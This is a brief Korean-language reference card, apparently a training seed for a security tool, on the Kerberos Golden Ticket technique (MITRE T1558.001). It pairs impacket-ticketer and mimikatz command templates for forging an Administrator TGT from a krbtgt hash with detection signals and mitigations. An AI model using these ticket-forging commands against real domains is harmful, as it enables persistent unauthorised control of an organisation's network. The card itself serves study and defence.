# 학습 시드(심화): golden-ticket

> 종합 레퍼런스(확립된 보안 지식 · 권위 출처 검증가능). 라이브 최신화: `assassin --learn golden-ticket`. P1: 머신별 라이트업 미참조.

## 개요
Golden Ticket(T1558.001): krbtgt 해시로 임의 TGT 위조 → 도메인 전체 지속 접근.

## 핵심 기법 · 열거
- krbtgt NTLM 해시 필요(DCSync 등으로 획득)
- 임의 사용자/그룹 위조

## 표준 도구 · 명령
```
impacket-ticketer -nthash <krbtgt> -domain-sid <sid> -domain <d> Administrator
mimikatz: kerberos::golden /user:Administrator /krbtgt:<hash> ...
```

## 블루팀 탐지
비정상 장수명 TGT·존재하지 않는 계정 티켓·4769 불일치.

## 완화
krbtgt 2회 리셋(정기)·DCSync 권한 최소화·티어링.

- 출처(검증): https://attack.mitre.org/techniques/T1558/001/
